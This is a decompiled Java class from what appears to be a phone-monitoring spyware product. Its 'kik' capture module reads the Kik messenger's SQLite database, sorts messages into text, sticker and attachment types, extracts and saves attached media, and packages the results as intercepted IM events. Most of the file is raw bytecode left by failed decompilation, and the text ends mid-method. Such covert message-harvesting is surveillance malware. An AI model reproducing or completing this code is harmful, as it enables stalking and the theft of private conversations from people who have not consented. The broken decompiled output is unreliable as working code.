package com.vvt.capture.kik;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.media.ThumbnailUtils;
import android.os.SystemClock;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxIMAccountEvent;
import com.vvt.events.FxIMContactEvent;
import com.vvt.events.FxIMConversationEvent;
import com.vvt.events.FxIMMessageEvent;
import com.vvt.events.FxIMMessageServiceType;
import com.vvt.im.events.ImMediaFileType;
import com.vvt.im.events.ImType;
import com.vvt.im.events.MessageType;
import com.vvt.im.events.info.f;
import com.vvt.io.p;
import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;

public class b
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private static boolean c = false;
  
  public static long a()
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    long l = b(null);
    boolean bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    return l;
  }
  
  /* Error */
  public static long a(int paramInt, String paramString)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_2
    //   3: dconst_0
    //   4: dconst_0
    //   5: ddiv
    //   6: dstore 4
    //   8: aconst_null
    //   9: astore 6
    //   11: aload_1
    //   12: invokestatic 28	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   15: istore 7
    //   17: iload 7
    //   19: ifeq +7 -> 26
    //   22: invokestatic 33	com/vvt/n/a/MyUncaughtExceptionHandler/a:removeFromPath	()Ljava/lang/String;
    //   25: astore_1
    //   26: aload_1
    //   27: invokestatic 28	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   30: istore 7
    //   32: iload 7
    //   34: ifne +302 -> 336
    //   37: aload_1
    //   38: invokestatic 38	com/vvt/capture/kik/a/a:a	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   41: astore 8
    //   43: aload 8
    //   45: ifnull +282 -> 327
    //   48: iconst_m1
    //   49: istore 9
    //   51: iload_0
    //   52: iload 9
    //   54: if_icmpeq +273 -> 327
    //   57: ldc 42
    //   59: astore 10
    //   61: iconst_0
    //   62: istore 11
    //   64: aconst_null
    //   65: astore 12
    //   67: aconst_null
    //   68: astore 13
    //   70: iconst_0
    //   71: istore 14
    //   73: ldc 40
    //   75: astore 15
    //   77: iload_0
    //   78: invokestatic 48	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   81: astore 16
    //   83: aload 8
    //   85: aload 10
    //   87: aconst_null
    //   88: aconst_null
    //   89: aconst_null
    //   90: aconst_null
    //   91: aconst_null
    //   92: aload 15
    //   94: aload 16
    //   96: invokevirtual 54	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   99: astore 10
    //   101: aload 10
    //   103: ifnull +214 -> 317
    //   106: aload 10
    //   108: invokeinterface 60 1 0
    //   113: istore 11
    //   115: iload 11
    //   117: ifeq +74 -> 191
    //   120: ldc 62
    //   122: astore 12
    //   124: aload 10
    //   126: aload 12
    //   128: invokeinterface 66 2 0
    //   133: istore 11
    //   135: aload 10
    //   137: iload 11
    //   139: invokeinterface 70 2 0
    //   144: lstore_2
    //   145: aload 10
    //   147: astore 13
    //   149: lload_2
    //   150: lstore 17
    //   152: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   155: istore 14
    //   157: iload 14
    //   159: ifeq +3 -> 162
    //   162: aload 13
    //   164: ifnull +10 -> 174
    //   167: aload 13
    //   169: invokeinterface 74 1 0
    //   174: aload 8
    //   176: ifnull +8 -> 184
    //   179: aload 8
    //   181: invokevirtual 75	android/database/sqlite/SQLiteDatabase:close	()V
    //   184: lload 17
    //   186: lstore 19
    //   188: lload 19
    //   190: lreturn
    //   191: lconst_0
    //   192: lstore_2
    //   193: dconst_0
    //   194: dstore 4
    //   196: aload 10
    //   198: astore 13
    //   200: lload_2
    //   201: lstore 17
    //   203: goto -51 -> 152
    //   206: astore 10
    //   208: aconst_null
    //   209: astore 13
    //   211: iconst_m1
    //   212: i2l
    //   213: lstore 17
    //   215: getstatic 18	com/vvt/capture/kik/removeFromPath:removeFromPath	Z
    //   218: istore 14
    //   220: iload 14
    //   222: ifeq +3 -> 225
    //   225: aload 13
    //   227: ifnull +10 -> 237
    //   230: aload 13
    //   232: invokeinterface 74 1 0
    //   237: aload 8
    //   239: ifnull +8 -> 247
    //   242: aload 8
    //   244: invokevirtual 75	android/database/sqlite/SQLiteDatabase:close	()V
    //   247: lload 17
    //   249: lstore 19
    //   251: goto -63 -> 188
    //   254: astore 10
    //   256: aload 6
    //   258: ifnull +10 -> 268
    //   261: aload 6
    //   263: invokeinterface 74 1 0
    //   268: aload 8
    //   270: ifnull +8 -> 278
    //   273: aload 8
    //   275: invokevirtual 75	android/database/sqlite/SQLiteDatabase:close	()V
    //   278: aload 10
    //   280: athrow
    //   281: astore 12
    //   283: aload 10
    //   285: astore 6
    //   287: aload 12
    //   289: astore 10
    //   291: goto -35 -> 256
    //   294: astore 10
    //   296: aload 13
    //   298: astore 6
    //   300: goto -44 -> 256
    //   303: astore 12
    //   305: aload 10
    //   307: astore 13
    //   309: goto -98 -> 211
    //   312: astore 10
    //   314: goto -103 -> 211
    //   317: aload 10
    //   319: astore 13
    //   321: lload_2
    //   322: lstore 17
    //   324: goto -172 -> 152
    //   327: aconst_null
    //   328: astore 13
    //   330: lload_2
    //   331: lstore 17
    //   333: goto -181 -> 152
    //   336: lload_2
    //   337: lstore 19
    //   339: goto -151 -> 188
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	342	0	paramInt	int
    //   0	342	1	paramString	String
    //   2	335	2	l1	long
    //   6	189	4	d	double
    //   9	290	6	localObject1	Object
    //   15	18	7	bool1	boolean
    //   41	233	8	localSQLiteDatabase	SQLiteDatabase
    //   49	6	9	i	int
    //   59	138	10	localObject2	Object
    //   206	1	10	localException1	Exception
    //   254	30	10	localObject3	Object
    //   289	1	10	localObject4	Object
    //   294	12	10	localObject5	Object
    //   312	6	10	localException2	Exception
    //   62	54	11	bool2	boolean
    //   133	5	11	j	int
    //   65	62	12	str1	String
    //   281	7	12	localObject6	Object
    //   303	1	12	localException3	Exception
    //   68	261	13	localObject7	Object
    //   71	150	14	bool3	boolean
    //   75	18	15	str2	String
    //   81	14	16	str3	String
    //   150	182	17	l2	long
    //   186	152	19	l3	long
    // Exception table:
    //   from	to	target	type
    //   77	81	206	java/lang/Exception
    //   94	99	206	java/lang/Exception
    //   77	81	254	finally
    //   94	99	254	finally
    //   106	113	281	finally
    //   126	133	281	finally
    //   137	144	281	finally
    //   152	155	294	finally
    //   215	218	294	finally
    //   106	113	303	java/lang/Exception
    //   126	133	303	java/lang/Exception
    //   137	144	303	java/lang/Exception
    //   152	155	312	java/lang/Exception
  }
  
  /* Error */
  private static com.vvt.im.events.info.a a(SQLiteDatabase paramSQLiteDatabase, KikData paramKikData, String paramString1, String paramString2, com.vvt.base.b paramb)
  {
    // Byte code:
    //   0: new 79	com/vvt/im/events/info/a
    //   3: astore 5
    //   5: aload 5
    //   7: invokespecial 82	com/vvt/im/events/info/a:<init>	()V
    //   10: iconst_0
    //   11: istore 6
    //   13: aconst_null
    //   14: astore 7
    //   16: iconst_0
    //   17: istore 8
    //   19: aconst_null
    //   20: astore 9
    //   22: iconst_0
    //   23: istore 10
    //   25: aconst_null
    //   26: astore 11
    //   28: iconst_0
    //   29: istore 12
    //   31: fconst_0
    //   32: fstore 13
    //   34: aconst_null
    //   35: astore 14
    //   37: iconst_m1
    //   38: i2l
    //   39: lstore 15
    //   41: aconst_null
    //   42: astore 17
    //   44: iconst_0
    //   45: putstatic 20	com/vvt/capture/kik/removeFromPath:MyUncaughtExceptionHandler	Z
    //   48: invokestatic 85	com/vvt/capture/kik/removeFromPath:d	()Ljava/lang/String;
    //   51: astore 17
    //   53: iconst_1
    //   54: istore 18
    //   56: iload 18
    //   58: anewarray 88	java/lang/String
    //   61: astore 19
    //   63: iconst_0
    //   64: istore 20
    //   66: fconst_0
    //   67: fstore 21
    //   69: aconst_null
    //   70: astore 22
    //   72: aload 19
    //   74: iconst_0
    //   75: aload_2
    //   76: aastore
    //   77: aload_0
    //   78: aload 17
    //   80: aload 19
    //   82: invokevirtual 92	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   85: astore 17
    //   87: aload 17
    //   89: ifnull +726 -> 815
    //   92: aload 17
    //   94: invokeinterface 95 1 0
    //   99: istore 12
    //   101: iload 12
    //   103: ifeq +712 -> 815
    //   106: ldc 97
    //   108: astore 19
    //   110: iconst_1
    //   111: istore 20
    //   113: ldc 86
    //   115: fstore 21
    //   117: getstatic 103	com/vvt/im/events/MessageType:none	Lcom/vvt/im/events/MessageType;
    //   120: astore 14
    //   122: aload 14
    //   124: invokevirtual 107	com/vvt/im/events/MessageType:getNumber	()I
    //   127: istore 23
    //   129: ldc 109
    //   131: astore 14
    //   133: aload 17
    //   135: aload 14
    //   137: invokeinterface 66 2 0
    //   142: istore 12
    //   144: aload 17
    //   146: iload 12
    //   148: invokeinterface 112 2 0
    //   153: astore 14
    //   155: ldc 114
    //   157: astore 24
    //   159: iconst_2
    //   160: istore 25
    //   162: iload 25
    //   164: anewarray 4	java/lang/Object
    //   167: astore 26
    //   169: iconst_0
    //   170: istore 27
    //   172: aconst_null
    //   173: astore 28
    //   175: ldc 117
    //   177: astore 29
    //   179: aload 26
    //   181: iconst_0
    //   182: aload 29
    //   184: aastore
    //   185: iconst_1
    //   186: istore 27
    //   188: ldc 119
    //   190: astore 29
    //   192: aload 26
    //   194: iload 27
    //   196: aload 29
    //   198: aastore
    //   199: aload 24
    //   201: aload 26
    //   203: invokestatic 123	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   206: astore 24
    //   208: getstatic 129	com/vvt/im/events/ImType:KIK	Lcom/vvt/im/events/ImType;
    //   211: astore 26
    //   213: getstatic 135	com/vvt/im/events/ImMediaFileType:ATTACHMENT	Lcom/vvt/im/events/ImMediaFileType;
    //   216: astore 28
    //   218: aload_3
    //   219: aload 26
    //   221: aload 28
    //   223: invokestatic 140	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Lcom/vvt/im/events/ImType;Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   226: astore 26
    //   228: getstatic 135	com/vvt/im/events/ImMediaFileType:ATTACHMENT	Lcom/vvt/im/events/ImMediaFileType;
    //   231: astore 28
    //   233: aload 28
    //   235: invokestatic 143	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   238: astore 28
    //   240: ldc -111
    //   242: astore 29
    //   244: aload 14
    //   246: aload 29
    //   248: invokevirtual 148	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   251: istore 30
    //   253: iload 30
    //   255: ifne +39 -> 294
    //   258: ldc -106
    //   260: astore 29
    //   262: aload 14
    //   264: aload 29
    //   266: invokevirtual 148	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   269: istore 30
    //   271: iload 30
    //   273: ifne +21 -> 294
    //   276: ldc -104
    //   278: astore 29
    //   280: aload 14
    //   282: aload 29
    //   284: invokevirtual 148	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   287: istore 30
    //   289: iload 30
    //   291: ifeq +549 -> 840
    //   294: aload_0
    //   295: aload_2
    //   296: invokestatic 156	com/vvt/capture/kik/removeFromPath:FxFileObserverWorker	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Ljava/lang/String;
    //   299: astore 7
    //   301: aload_3
    //   302: invokestatic 159	com/vvt/capture/kik/removeFromPath:a	(Ljava/lang/String;)Ljava/lang/String;
    //   305: astore 14
    //   307: aload 14
    //   309: aload 24
    //   311: aload 7
    //   313: invokestatic 162	com/vvt/n/a/MyUncaughtExceptionHandler/a:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   316: astore 11
    //   318: aload_0
    //   319: aload_2
    //   320: invokestatic 164	com/vvt/capture/kik/removeFromPath:d	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Ljava/lang/String;
    //   323: astore 14
    //   325: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   328: istore 31
    //   330: iload 31
    //   332: ifeq +3 -> 335
    //   335: aload 14
    //   337: invokestatic 28	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   340: istore 31
    //   342: iload 31
    //   344: ifne +17 -> 361
    //   347: aload 14
    //   349: invokevirtual 167	java/lang/String:trim	()Ljava/lang/String;
    //   352: astore 14
    //   354: aload 14
    //   356: invokestatic 172	java/lang/Long:parseLong	(Ljava/lang/String;)J
    //   359: lstore 15
    //   361: aload_0
    //   362: aload_2
    //   363: invokestatic 175	com/vvt/capture/kik/removeFromPath:f	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Ljava/lang/String;
    //   366: astore 14
    //   368: aload 14
    //   370: ifnull +28 -> 398
    //   373: ldc -104
    //   375: astore 24
    //   377: aload 14
    //   379: aload 24
    //   381: invokevirtual 179	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   384: istore 12
    //   386: iload 12
    //   388: ifeq +10 -> 398
    //   391: iconst_3
    //   392: istore 20
    //   394: ldc -76
    //   396: fstore 21
    //   398: aload 11
    //   400: invokestatic 28	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   403: istore 12
    //   405: iload 12
    //   407: ifeq +1367 -> 1774
    //   410: iload 20
    //   412: aload 4
    //   414: lload 15
    //   416: invokestatic 183	com/vvt/capture/kik/removeFromPath:a	(ILcom/vvt/base/removeFromPath;J)Z
    //   419: istore 12
    //   421: iload 12
    //   423: putstatic 20	com/vvt/capture/kik/removeFromPath:MyUncaughtExceptionHandler	Z
    //   426: getstatic 20	com/vvt/capture/kik/removeFromPath:MyUncaughtExceptionHandler	Z
    //   429: istore 12
    //   431: iload 12
    //   433: ifeq +1341 -> 1774
    //   436: aload_0
    //   437: aload_2
    //   438: invokestatic 185	com/vvt/capture/kik/removeFromPath:e	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Ljava/lang/String;
    //   441: astore 14
    //   443: aload 14
    //   445: invokestatic 28	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   448: istore 32
    //   450: iload 32
    //   452: ifne +1322 -> 1774
    //   455: aload 14
    //   457: invokestatic 188	com/vvt/capture/kik/removeFromPath:e	(Ljava/lang/String;)[B
    //   460: astore 14
    //   462: aload 14
    //   464: ifnull +1310 -> 1774
    //   467: aload 14
    //   469: arraylength
    //   470: istore 32
    //   472: iconst_2
    //   473: istore 33
    //   475: iload 32
    //   477: iload 33
    //   479: if_icmplt +1295 -> 1774
    //   482: iconst_0
    //   483: istore 32
    //   485: aconst_null
    //   486: astore 34
    //   488: aload 14
    //   490: iconst_0
    //   491: baload
    //   492: istore 32
    //   494: bipush 60
    //   496: istore 33
    //   498: iload 32
    //   500: iload 33
    //   502: if_icmpeq +1272 -> 1774
    //   505: iconst_1
    //   506: istore 32
    //   508: aload 14
    //   510: iload 32
    //   512: baload
    //   513: istore 32
    //   515: bipush 33
    //   517: istore 33
    //   519: iload 32
    //   521: iload 33
    //   523: if_icmpeq +1251 -> 1774
    //   526: aload 14
    //   528: aload 26
    //   530: aload 28
    //   532: invokestatic 195	com/vvt/io/d:a	([BLjava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   535: astore 14
    //   537: iload 20
    //   539: istore 8
    //   541: aload 14
    //   543: astore 22
    //   545: aload 7
    //   547: astore 14
    //   549: aload 11
    //   551: invokestatic 28	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   554: istore 6
    //   556: iload 6
    //   558: ifne +105 -> 663
    //   561: aload 11
    //   563: invokestatic 197	com/vvt/capture/kik/removeFromPath:MyUncaughtExceptionHandler	(Ljava/lang/String;)J
    //   566: lstore 35
    //   568: iload 8
    //   570: aload 4
    //   572: lload 35
    //   574: invokestatic 183	com/vvt/capture/kik/removeFromPath:a	(ILcom/vvt/base/removeFromPath;J)Z
    //   577: istore 6
    //   579: iload 6
    //   581: putstatic 20	com/vvt/capture/kik/removeFromPath:MyUncaughtExceptionHandler	Z
    //   584: getstatic 20	com/vvt/capture/kik/removeFromPath:MyUncaughtExceptionHandler	Z
    //   587: istore 6
    //   589: iload 6
    //   591: ifeq +72 -> 663
    //   594: new 199	java/lang/StringBuilder
    //   597: astore 22
    //   599: aload 22
    //   601: invokespecial 200	java/lang/StringBuilder:<init>	()V
    //   604: aload 22
    //   606: aload 26
    //   608: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   611: astore 22
    //   613: getstatic 210	java/io/File:separator	Ljava/lang/String;
    //   616: astore 7
    //   618: aload 22
    //   620: aload 7
    //   622: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   625: astore 22
    //   627: aload 22
    //   629: aload 28
    //   631: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   634: astore 22
    //   636: aload 22
    //   638: invokevirtual 212	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   641: astore 22
    //   643: aload 4
    //   645: invokevirtual 216	com/vvt/base/removeFromPath:f	()Ljava/lang/String;
    //   648: astore 7
    //   650: aload 11
    //   652: aload 26
    //   654: aload 28
    //   656: aload_3
    //   657: aload 7
    //   659: invokestatic 221	com/vvt/capture/kik/removeFromPath/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   662: pop
    //   663: aload 22
    //   665: invokestatic 28	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   668: istore 10
    //   670: iload 10
    //   672: ifne +143 -> 815
    //   675: new 206	java/io/File
    //   678: astore 11
    //   680: aload 11
    //   682: aload 22
    //   684: invokespecial 224	java/io/File:<init>	(Ljava/lang/String;)V
    //   687: aload 11
    //   689: invokevirtual 228	java/io/File:length	()J
    //   692: lstore 35
    //   694: iload 8
    //   696: aload 4
    //   698: lload 35
    //   700: invokestatic 183	com/vvt/capture/kik/removeFromPath:a	(ILcom/vvt/base/removeFromPath;J)Z
    //   703: istore 6
    //   705: iload 6
    //   707: putstatic 20	com/vvt/capture/kik/removeFromPath:MyUncaughtExceptionHandler	Z
    //   710: getstatic 20	com/vvt/capture/kik/removeFromPath:MyUncaughtExceptionHandler	Z
    //   713: istore 6
    //   715: iload 6
    //   717: ifeq +920 -> 1637
    //   720: iconst_3
    //   721: istore 10
    //   723: iload 8
    //   725: iload 10
    //   727: if_icmpne +763 -> 1490
    //   730: new 199	java/lang/StringBuilder
    //   733: astore 14
    //   735: aload 14
    //   737: invokespecial 200	java/lang/StringBuilder:<init>	()V
    //   740: aload 14
    //   742: aload 28
    //   744: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   747: astore 14
    //   749: ldc -26
    //   751: astore 9
    //   753: aload 14
    //   755: aload 9
    //   757: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   760: astore 14
    //   762: aload 14
    //   764: invokevirtual 212	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   767: astore 19
    //   769: ldc -24
    //   771: astore 14
    //   773: aload_3
    //   774: aload 22
    //   776: invokestatic 235	com/vvt/capture/kik/removeFromPath:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   779: astore 9
    //   781: aload 5
    //   783: aload 19
    //   785: invokevirtual 237	com/vvt/im/events/info/a:a	(Ljava/lang/String;)V
    //   788: aload 5
    //   790: aload 22
    //   792: invokevirtual 239	com/vvt/im/events/info/a:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   795: aload 5
    //   797: aload 14
    //   799: invokevirtual 241	com/vvt/im/events/info/a:removeFromPath	(Ljava/lang/String;)V
    //   802: aload 5
    //   804: aload 9
    //   806: invokevirtual 243	com/vvt/im/events/info/a:d	(Ljava/lang/String;)V
    //   809: aload_1
    //   810: iload 23
    //   812: invokevirtual 248	com/vvt/capture/kik/KikData:a	(I)V
    //   815: aload 17
    //   817: ifnull +10 -> 827
    //   820: aload 17
    //   822: invokeinterface 74 1 0
    //   827: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   830: istore 12
    //   832: iload 12
    //   834: ifeq +3 -> 837
    //   837: aload 5
    //   839: areturn
    //   840: ldc -6
    //   842: astore 34
    //   844: aload 14
    //   846: aload 34
    //   848: invokevirtual 148	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   851: istore 32
    //   853: iload 32
    //   855: ifne +21 -> 876
    //   858: ldc -4
    //   860: astore 34
    //   862: aload 14
    //   864: aload 34
    //   866: invokevirtual 148	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   869: istore 32
    //   871: iload 32
    //   873: ifeq +59 -> 932
    //   876: aload_0
    //   877: aload_2
    //   878: invokestatic 254	com/vvt/capture/kik/removeFromPath:MyUncaughtExceptionHandler	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Ljava/lang/String;
    //   881: astore 11
    //   883: aload_3
    //   884: invokestatic 159	com/vvt/capture/kik/removeFromPath:a	(Ljava/lang/String;)Ljava/lang/String;
    //   887: astore 14
    //   889: aload 14
    //   891: aload 24
    //   893: aload 11
    //   895: invokestatic 162	com/vvt/n/a/MyUncaughtExceptionHandler/a:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   898: astore 14
    //   900: iload 20
    //   902: istore 37
    //   904: iconst_0
    //   905: istore 20
    //   907: aconst_null
    //   908: astore 22
    //   910: fconst_0
    //   911: fstore 21
    //   913: iload 37
    //   915: istore 8
    //   917: aload 14
    //   919: astore 38
    //   921: aload 11
    //   923: astore 14
    //   925: aload 38
    //   927: astore 11
    //   929: goto -380 -> 549
    //   932: ldc_w 256
    //   935: astore 34
    //   937: aload 14
    //   939: aload 34
    //   941: invokevirtual 148	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   944: istore 32
    //   946: iload 32
    //   948: ifeq +154 -> 1102
    //   951: aload_0
    //   952: aload_2
    //   953: invokestatic 258	com/vvt/capture/kik/removeFromPath:removeFromPath	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Ljava/lang/String;
    //   956: astore 14
    //   958: aload 14
    //   960: ifnull +118 -> 1078
    //   963: new 260	org/json/JSONObject
    //   966: astore 34
    //   968: aload 34
    //   970: aload 14
    //   972: invokespecial 261	org/json/JSONObject:<init>	(Ljava/lang/String;)V
    //   975: ldc_w 263
    //   978: astore 14
    //   980: aload 34
    //   982: aload 14
    //   984: invokevirtual 267	org/json/JSONObject:get	(Ljava/lang/String;)Ljava/lang/Object;
    //   987: astore 14
    //   989: aload 14
    //   991: checkcast 88	java/lang/String
    //   994: astore 14
    //   996: aload 14
    //   998: invokestatic 188	com/vvt/capture/kik/removeFromPath:e	(Ljava/lang/String;)[B
    //   1001: astore 14
    //   1003: aload 14
    //   1005: ifnull +73 -> 1078
    //   1008: aload 14
    //   1010: arraylength
    //   1011: istore 32
    //   1013: iconst_2
    //   1014: istore 33
    //   1016: iload 32
    //   1018: iload 33
    //   1020: if_icmplt +58 -> 1078
    //   1023: iconst_0
    //   1024: istore 32
    //   1026: aconst_null
    //   1027: astore 34
    //   1029: aload 14
    //   1031: iconst_0
    //   1032: baload
    //   1033: istore 32
    //   1035: bipush 60
    //   1037: istore 33
    //   1039: iload 32
    //   1041: iload 33
    //   1043: if_icmpeq +35 -> 1078
    //   1046: iconst_1
    //   1047: istore 32
    //   1049: aload 14
    //   1051: iload 32
    //   1053: baload
    //   1054: istore 32
    //   1056: bipush 33
    //   1058: istore 33
    //   1060: iload 32
    //   1062: iload 33
    //   1064: if_icmpeq +14 -> 1078
    //   1067: aload 14
    //   1069: aload 26
    //   1071: aload 28
    //   1073: invokestatic 195	com/vvt/io/d:a	([BLjava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   1076: astore 9
    //   1078: iconst_0
    //   1079: istore 12
    //   1081: aconst_null
    //   1082: astore 14
    //   1084: fconst_0
    //   1085: fstore 13
    //   1087: aload 9
    //   1089: astore 39
    //   1091: iload 20
    //   1093: istore 8
    //   1095: aload 9
    //   1097: astore 22
    //   1099: goto -550 -> 549
    //   1102: ldc_w 269
    //   1105: astore 34
    //   1107: aload 14
    //   1109: aload 34
    //   1111: invokevirtual 148	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   1114: istore 32
    //   1116: iload 32
    //   1118: ifeq +75 -> 1193
    //   1121: aload_0
    //   1122: aload_2
    //   1123: invokestatic 254	com/vvt/capture/kik/removeFromPath:MyUncaughtExceptionHandler	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Ljava/lang/String;
    //   1126: astore 11
    //   1128: aload_3
    //   1129: invokestatic 159	com/vvt/capture/kik/removeFromPath:a	(Ljava/lang/String;)Ljava/lang/String;
    //   1132: astore 14
    //   1134: aload 14
    //   1136: aload 24
    //   1138: aload 11
    //   1140: invokestatic 162	com/vvt/n/a/MyUncaughtExceptionHandler/a:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   1143: astore 40
    //   1145: getstatic 272	com/vvt/im/events/MessageType:Sticker	Lcom/vvt/im/events/MessageType;
    //   1148: astore 14
    //   1150: aload 14
    //   1152: invokevirtual 107	com/vvt/im/events/MessageType:getNumber	()I
    //   1155: istore 12
    //   1157: iload 20
    //   1159: istore 37
    //   1161: iconst_0
    //   1162: istore 20
    //   1164: aconst_null
    //   1165: astore 22
    //   1167: fconst_0
    //   1168: fstore 21
    //   1170: iload 37
    //   1172: istore 8
    //   1174: aload 40
    //   1176: astore 38
    //   1178: iload 12
    //   1180: istore 23
    //   1182: aload 11
    //   1184: astore 14
    //   1186: aload 40
    //   1188: astore 11
    //   1190: goto -641 -> 549
    //   1193: ldc_w 274
    //   1196: astore 34
    //   1198: aload 14
    //   1200: aload 34
    //   1202: invokevirtual 148	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   1205: istore 32
    //   1207: iload 32
    //   1209: ifeq +156 -> 1365
    //   1212: aload_0
    //   1213: aload_2
    //   1214: invokestatic 254	com/vvt/capture/kik/removeFromPath:MyUncaughtExceptionHandler	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Ljava/lang/String;
    //   1217: astore 7
    //   1219: aload_3
    //   1220: invokestatic 159	com/vvt/capture/kik/removeFromPath:a	(Ljava/lang/String;)Ljava/lang/String;
    //   1223: astore 14
    //   1225: aload 14
    //   1227: aload 24
    //   1229: aload 7
    //   1231: invokestatic 162	com/vvt/n/a/MyUncaughtExceptionHandler/a:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   1234: astore 11
    //   1236: getstatic 277	com/vvt/im/events/MessageType:Text	Lcom/vvt/im/events/MessageType;
    //   1239: astore 14
    //   1241: aload 14
    //   1243: invokevirtual 107	com/vvt/im/events/MessageType:getNumber	()I
    //   1246: istore 23
    //   1248: aload_0
    //   1249: aload_2
    //   1250: invokestatic 258	com/vvt/capture/kik/removeFromPath:removeFromPath	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Ljava/lang/String;
    //   1253: astore 14
    //   1255: aload 14
    //   1257: ifnull +82 -> 1339
    //   1260: new 260	org/json/JSONObject
    //   1263: astore 34
    //   1265: aload 34
    //   1267: aload 14
    //   1269: invokespecial 261	org/json/JSONObject:<init>	(Ljava/lang/String;)V
    //   1272: ldc_w 279
    //   1275: astore 14
    //   1277: aload 34
    //   1279: aload 14
    //   1281: invokevirtual 267	org/json/JSONObject:get	(Ljava/lang/String;)Ljava/lang/Object;
    //   1284: astore 14
    //   1286: aload 14
    //   1288: checkcast 88	java/lang/String
    //   1291: astore 14
    //   1293: new 199	java/lang/StringBuilder
    //   1296: astore 34
    //   1298: aload 34
    //   1300: invokespecial 200	java/lang/StringBuilder:<init>	()V
    //   1303: ldc_w 281
    //   1306: astore 41
    //   1308: aload 34
    //   1310: aload 41
    //   1312: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1315: astore 34
    //   1317: aload 34
    //   1319: aload 14
    //   1321: invokevirtual 204	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1324: astore 14
    //   1326: aload 14
    //   1328: invokevirtual 212	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1331: astore 14
    //   1333: aload_1
    //   1334: aload 14
    //   1336: invokevirtual 282	com/vvt/capture/kik/KikData:a	(Ljava/lang/String;)V
    //   1339: aload 7
    //   1341: astore 14
    //   1343: iconst_0
    //   1344: istore 37
    //   1346: aconst_null
    //   1347: astore 39
    //   1349: iload 20
    //   1351: istore 8
    //   1353: iconst_0
    //   1354: istore 20
    //   1356: aconst_null
    //   1357: astore 22
